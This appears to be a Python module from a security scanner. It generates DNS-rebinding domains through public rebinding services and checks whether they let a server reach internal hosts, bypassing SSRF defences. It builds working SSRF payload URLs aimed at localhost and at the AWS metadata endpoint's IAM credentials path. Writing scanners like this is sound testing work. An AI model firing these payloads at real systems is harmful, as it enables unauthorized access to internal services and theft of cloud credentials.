"""
DNS Rebinding Detector for SSRF
檢測 DNS rebinding 攻擊向量，用於繞過基於域名的 SSRF 防護
"""

import asyncio
import socket
import time
from dataclasses import dataclass
from typing import List, Optional

import httpx

from services.aiva_common.utils import get_logger

logger = get_logger(__name__)


@dataclass
class DnsRebindingVector:
    """DNS Rebinding 測試向量"""
    domain: str
    initial_ip: str
    rebind_ip: str
    description: str
    ttl: int = 1  # DNS TTL in seconds


class DnsRebindingDetector:
    """DNS Rebinding 檢測器"""
    
    # Public DNS rebinding services for testing
    _REBINDING_SERVICES = [
        # 7.7.7.7 service - resolves to attacker IP then target IP
        "http://7f000001.1time.127.0.0.1.1time.repeat.rebind.it/",
        # Rebinder.net service
        "http://127.0.0.1.1.rebinder.net/",
        # Custom rebinding format: A.B.C.D.E.F.G.H.rbndr.us
        # First IP: A.B.C.D, Second IP: E.F.G.H
        "http://1.2.3.4.127.0.0.1.rbndr.us/",
    ]
    
    def __init__(self, timeout: float = 10.0):
        """
        初始化 DNS Rebinding 檢測器
        
        Args:
            timeout: 請求超時時間（秒）
        """
        self.timeout = timeout
    
    def generate_vectors(
        self,
        target_internal_ip: str = "127.0.0.1",
        attacker_ip: str = "1.2.3.4"
    ) -> List[DnsRebindingVector]:
        """
        生成 DNS rebinding 測試向量
        
        Args:
            target_internal_ip: 目標內部 IP（要訪問的內部服務）
            attacker_ip: 攻擊者控制的外部 IP
        
        Returns:
            DNS rebinding 測試向量列表
        """
        vectors = []
        
        # 1. Using rebind.it service
        rebind_domain = self._generate_rebind_it_domain(attacker_ip, target_internal_ip)
        vectors.append(DnsRebindingVector(
            domain=rebind_domain,
            initial_ip=attacker_ip,
            rebind_ip=target_internal_ip,
            description="DNS rebinding using rebind.it service",
            ttl=1
        ))
        
        # 2. Using rbndr.us service
        rbndr_domain = self._generate_rbndr_domain(attacker_ip, target_internal_ip)
        vectors.append(DnsRebindingVector(
            domain=rbndr_domain,
            initial_ip=attacker_ip,
            rebind_ip=target_internal_ip,
            description="DNS rebinding using rbndr.us service",
            ttl=1
        ))
        
        # 3. Using 7.7.7.7 rebind service (localhost specific)
        if target_internal_ip == "127.0.0.1":
            vectors.append(DnsRebindingVector(
                domain="7f000001.1time.127.0.0.1.1time.repeat.rebind.it",
                initial_ip="127.127.127.127",
                rebind_ip="127.0.0.1",
                description="DNS rebinding to localhost using rebind.it",
                ttl=1
            ))
        
        return vectors
    
    def _generate_rebind_it_domain(self, first_ip: str, second_ip: str) -> str:
        """
        生成 rebind.it 格式的域名
        格式: <first_ip_hex>.1time.<second_ip_hex>.1time.repeat.rebind.it
        
        Args:
            first_ip: 第一次解析的 IP
            second_ip: 第二次解析的 IP（rebind target）
        
        Returns:
            rebind.it 格式的域名
        """
        def ip_to_hex(ip: str) -> str:
            """Convert IP address to hex format (e.g., 127.0.0.1 -> 7f000001)"""
            try:
                parts = [int(p) for p in ip.split('.')]
                return ''.join(f'{p:02x}' for p in parts)
            except (ValueError, AttributeError):
                return "7f000001"  # fallback to localhost
        
        first_hex = ip_to_hex(first_ip)
        second_hex = ip_to_hex(second_ip)
        
        return f"{first_hex}.1time.{second_hex}.1time.repeat.rebind.it"
    
    def _generate_rbndr_domain(self, first_ip: str, second_ip: str) -> str:
        """
        生成 rbndr.us 格式的域名
        格式: A.B.C.D.E.F.G.H.rbndr.us (first IP: A.B.C.D, second IP: E.F.G.H)
        
        Args:
            first_ip: 第一次解析的 IP
            second_ip: 第二次解析的 IP（rebind target）
        
        Returns:
            rbndr.us 格式的域名
        """
        first_parts = first_ip.split('.')
        second_parts = second_ip.split('.')
        
        combined = '.'.join(first_parts + second_parts)
        return f"{combined}.rbndr.us"
    
    async def test_rebinding(
        self,
        vector: DnsRebindingVector,
        client: Optional[httpx.AsyncClient] = None
    ) -> bool:
        """
        測試 DNS rebinding 是否成功
        
        Args:
            vector: DNS rebinding 測試向量
            client: HTTP 客戶端（可選）
        
        Returns:
            True 如果檢測到 rebinding 行為
        """
        close_client = False
        if client is None:
            client = httpx.AsyncClient(timeout=self.timeout)
            close_client = True
        
        try:
            # Step 1: First DNS resolution
            logger.info(f"Testing DNS rebinding for domain: {vector.domain}")
            
            first_ips = self._resolve_domain(vector.domain)
            logger.debug(f"First DNS resolution: {first_ips}")
            
            if not first_ips:
                logger.warning(f"Failed to resolve domain: {vector.domain}")
                return False
            
            # Step 2: Wait for DNS cache to expire (TTL)
            wait_time = vector.ttl + 1
            logger.debug(f"Waiting {wait_time}s for DNS TTL to expire")
            await asyncio.sleep(wait_time)
            
            # Step 3: Second DNS resolution
            second_ips = self._resolve_domain(vector.domain)
            logger.debug(f"Second DNS resolution: {second_ips}")
            
            if not second_ips:
                logger.warning(f"Failed to resolve domain on second attempt: {vector.domain}")
                return False
            
            # Step 4: Check if rebinding occurred
            rebinding_detected = (
                set(first_ips) != set(second_ips) and
                vector.rebind_ip in second_ips
            )
            
            if rebinding_detected:
                logger.info(
                    f"DNS rebinding detected: {vector.domain}",
                    extra={
                        "first_ips": first_ips,
                        "second_ips": second_ips,
                        "target_ip": vector.rebind_ip
                    }
                )
            
            return rebinding_detected
            
        except Exception as exc:
            logger.error(
                f"Error testing DNS rebinding: {str(exc)}",
                extra={"domain": vector.domain}
            )
            return False
        
        finally:
            if close_client:
                await client.aclose()
    
    def _resolve_domain(self, domain: str) -> List[str]:
        """
        解析域名為 IP 列表
        
        Args:
            domain: 域名（可能包含 http:// 前綴）
        
        Returns:
            IP 地址列表
        """
        # Remove protocol if present
        if '://' in domain:
            domain = domain.split('://', 1)[1]
        
        # Remove path if present
        if '/' in domain:
            domain = domain.split('/', 1)[0]
        
        try:
            # Use socket.getaddrinfo for DNS resolution
            addr_info = socket.getaddrinfo(domain, None)
            ips = list({str(info[4][0]) for info in addr_info})
            return ips
        except socket.gaierror as exc:
            logger.debug(f"DNS resolution failed for {domain}: {str(exc)}")
            return []
    
    async def verify_internal_access(
        self,
        rebinding_url: str,
        internal_path: str = "/",
        client: Optional[httpx.AsyncClient] = None
    ) -> bool:
        """
        驗證通過 DNS rebinding 是否能訪問內部服務
        
        Args:
            rebinding_url: DNS rebinding URL
            internal_path: 內部服務路徑
            client: HTTP 客戶端（可選）
        
        Returns:
            True 如果成功訪問內部服務
        """
        close_client = False
        if client is None:
            client = httpx.AsyncClient(timeout=self.timeout, follow_redirects=True)
            close_client = True
        
        try:
            # Construct full URL
            base_url = rebinding_url.rstrip('/')
            full_url = f"{base_url}{internal_path}"
            
            # Make request after rebinding
            logger.debug(f"Attempting to access internal service: {full_url}")
            response = await client.get(full_url)
            
            # Check if we got a successful response
            if 200 <= response.status_code < 300:
                logger.info(
                    "Successfully accessed internal service via DNS rebinding",
                    extra={
                        "url": full_url,
                        "status_code": response.status_code,
                        "content_length": len(response.content)
                    }
                )
                return True
            
            return False
            
        except httpx.HTTPError as exc:
            logger.debug(
                f"Failed to access internal service: {str(exc)}",
                extra={"url": rebinding_url}
            )
            return False
        
        finally:
            if close_client:
                await client.aclose()
    
    def generate_payloads(
        self,
        internal_targets: Optional[List[str]] = None
    ) -> List[str]:
        """
        生成用於 SSRF 測試的 DNS rebinding payloads
        
        Args:
            parameter_name: 參數名稱
            internal_targets: 內部目標 IP 列表（可選）
        
        Returns:
            Payload 列表
        """
        if internal_targets is None:
            internal_targets = ["127.0.0.1", "169.254.169.254"]
        
        payloads = []
        
        for target_ip in internal_targets:
            vectors = self.generate_vectors(target_internal_ip=target_ip)
            for vector in vectors:
                # Generate HTTP URL payload
                payloads.append(f"http://{vector.domain}/")
                
                # For AWS metadata, add specific path
                if target_ip == "169.254.169.254":
                    payloads.append(
                        f"http://{vector.domain}/latest/meta-data/iam/security-credentials/"
                    )
        
        return payloads
